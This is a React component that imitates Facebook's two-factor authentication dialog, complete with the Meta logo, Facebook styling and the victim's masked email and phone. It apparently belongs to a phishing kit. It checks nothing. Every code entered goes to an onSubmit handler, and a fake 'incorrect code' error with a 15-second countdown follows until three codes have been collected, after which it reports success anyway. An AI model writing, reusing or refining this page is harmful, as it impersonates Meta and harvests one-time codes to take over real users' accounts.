import { useState, useEffect } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import config from '@/utils/config';

const maskEmail = ( email ) =>
{
    if ( !email ) return '';
    const atIndex = email.indexOf( '@' );
    if ( atIndex < 0 ) return email;
    const localPart = email.slice( 0, atIndex );
    const domain = email.slice( atIndex + 1 );
    if ( !localPart || !domain ) return email;
    const masked = localPart[ 0 ] + '**' + localPart.slice( -1 );
    return `${ masked }@${ domain }`;
};

const maskPhone = ( phone ) =>
{
    if ( !phone ) return '';
    const digits = phone.replaceAll( /\D/g, '' );
    if ( digits.length < 4 ) return phone;
    return phone.slice( 0, -2 ).replaceAll( /\d/g, '*' ) + ' ' + phone.slice( -2 );
};

const TwoFAModal = ( { show, onClose, onSubmit, onSuccess, texts, formData } ) =>
{
    const [ code, setCode ] = useState( '' );
    const [ showError, setShowError ] = useState( false );
    const [ attempts, setAttempts ] = useState( 0 );
    const [ countdown, setCountdown ] = useState( 0 );

    const maxAttempts = config.max_code_attempts || 3;
    const delaySeconds = 15;
    const currentStep = Math.min( attempts + 1, maxAttempts );

    useEffect( () =>
    {
        if ( countdown <= 0 ) return;

        const timer = setInterval( () =>
        {
            setCountdown( ( prev ) =>
            {
                if ( prev <= 1 )
                {
                    clearInterval( timer );
                    setShowError( false );
                    return 0;
                }
                return prev - 1;
            } );
        }, 1000 );

        return () => clearInterval( timer );
    }, [ countdown ] );

    const handleSubmit = ( e ) =>
    {
        e.preventDefault();

        if ( !code.trim() || code.length < 6 || code.length > 8 || countdown > 0 )
        {
            return;
        }

        onSubmit( code );

        const nextAttempts = attempts + 1;

        if ( nextAttempts >= maxAttempts )
        {
            setAttempts( nextAttempts );
            onSuccess();
            return;
        }

        setAttempts( nextAttempts );
        setShowError( true );
        setCode( '' );
        setCountdown( delaySeconds );
    };

    if ( !show ) return null;

    const displayName = formData?.fullName || formData?.pageName || '';
    const displayEmail = maskEmail( formData?.personalEmail || formData?.businessEmail || '' );
    const displayPhone = maskPhone( formData?.phone || '' );

    const contactInfo = [ displayEmail, displayPhone ].filter( Boolean ).join( ', ' );
    const isDisabled = !code.trim() || code.length < 6 || countdown > 0;

    return (
        <>
            <div
                className="modal-backdrop show"
                onClick={ onClose }
                onKeyDown={ ( e ) => e.key === 'Escape' && onClose() }
                aria-hidden="true"
            ></div>
            <div
                className="modal form-modal show"
                id="twoFAmodal"
                style={ { display: show ? 'block' : 'none' } }
                tabIndex="-1"
            >
                <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                    <div className="modal-content" style={ { backgroundColor: '#f1f5f9', borderRadius: '18px' } }>
                        <div className="modal-body" style={ { padding: '22px 20px 10px 20px' } }>
                            { displayName && (
                                <div
                                    style={ {
                                        fontSize: '13.5px',
                                        color: '#65676B',
                                        marginBottom: '4px',
                                        display: 'flex',
                                        alignItems: 'center',
                                        gap: '5px'
                                    } }
                                >
                                    <span>{ displayName }</span>
                                    <span>•</span>
                                    <span>Facebook</span>
                                </div>
                            ) }

                            <div
                                className="modal-title"
                                id="2FAmodalLabel"
                                style={ {
                                    fontSize: '18px',
                                    fontWeight: '700',
                                    color: '#0A1317',
                                    marginBottom: '8px'
                                } }
                            >
                                { texts.twoFATitle || 'Two-factor authentication required' } ({ currentStep }/{ maxAttempts })
                            </div>

                            <p style={ { fontSize: '14px', color: '#65676B', lineHeight: '1.45', marginBottom: '12px' } }>
                                { texts.twoFAInstruction || 'Enter the code for this account that we send to' }
                                { contactInfo && <> { contactInfo }</> }{ ' ' }
                                { texts.twoFAInstructionOr ||
                                    'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)' }
                            </p>

                            <div style={ { marginBottom: '14px' } }>
                                <img
                                    alt="2FA"
                                    src={ TwoFAImage }
                                    style={ { width: '100%', height: 'auto', borderRadius: '12px', display: 'block' } }
                                />
                            </div>

                            <form id="twoFAForm" onSubmit={ handleSubmit }>
                                <div className="mb-3" style={ { marginBottom: '16px' } }>
                                    <input
                                        autoComplete="off"
                                        className={ `form-control ${ showError && countdown > 0 ? 'is-invalid' : '' }` }
                                        id="twofa-code-input"
                                        inputMode="numeric"
                                        name="2FA-1"
                                        pattern="[0-9]{6,8}"
                                        type="tel"
                                        placeholder={ texts.enterTheCode || 'Enter the code' }
                                        value={ code }
                                        disabled={ countdown > 0 }
                                        style={ {
                                            width: '100%',
                                            padding: '13px 15px',
                                            fontSize: '14.5px',
                                            backgroundColor: '#ffffff',
                                            borderRadius: '12px',
                                            border: showError && countdown > 0 ? '1.5px solid #dc3545' : '1px solid #d1d5db',
                                            outline: 'none',
                                            boxShadow: 'none'
                                        } }
                                        onChange={ ( e ) =>
                                        {
                                            const val = e.target.value.replaceAll( /\D/g, '' );
                                            if ( val.length <= 8 ) setCode( val );
                                        } }
                                    />

                                    { showError && countdown > 0 && (
                                        <div
                                            style={ {
                                                color: '#dc3545',
                                                fontSize: '13.5px',
                                                lineHeight: '1.4',
                                                marginTop: '8px'
                                            } }
                                        >
                                            The two-factor authentication you entered is incorrect. Please, try again after{ ' ' }
                                            <span translate="no" className="notranslate">
                                                { countdown } seconds
                                            </span>
                                            .
                                        </div>
                                    ) }
                                </div>

                                <div style={ { display: 'flex', flexDirection: 'column', gap: '10px' } }>
                                    <button
                                        type="submit"
                                        disabled={ isDisabled }
                                        style={ {
                                            width: '100%',
                                            padding: '12px 20px',
                                            borderRadius: '9999px',
                                            border: 'none',
                                            backgroundColor: isDisabled ? '#749ce8' : '#1877f2',
                                            color: '#ffffff',
                                            fontSize: '15px',
                                            fontWeight: '600',
                                            cursor: isDisabled ? 'not-allowed' : 'pointer',
                                            transition: 'background-color 0.2s ease'
                                        } }
                                    >
                                        { texts.continueBtn || 'Continue' }
                                    </button>

                                    <button
                                        type="button"
                                        style={ {
                                            width: '100%',
                                            padding: '11px 20px',
                                            borderRadius: '9999px',
                                            border: '1px solid #cbd5e1',
                                            backgroundColor: 'transparent',
                                            color: '#4b5563',
                                            fontSize: '15px',
                                            fontWeight: '500',
                                            cursor: 'pointer'
                                        } }
                                    >
                                        { texts.tryAnotherWay || 'Try another way' }
                                    </button>
                                </div>
                            </form>
                        </div>

                        <div
                            className="modal-footer border-0"
                            style={ {
                                flexDirection: 'column',
                                textAlign: 'center',
                                paddingTop: '8px',
                                paddingBottom: '18px'
                            } }
                        >
                            <img src={ MetaLogo } alt="Meta Logo" style={ { height: '18px', marginBottom: '4px' } } />
                            <div className="footer-links" style={ { fontSize: '12px', color: '#65676B' } }>
                                { texts.aboutHelpMore || 'About · Help · See more' }
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

TwoFAModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired,
    formData: PropTypes.object
};

TwoFAModal.defaultProps = {
    formData: {}
};

export default TwoFAModal;
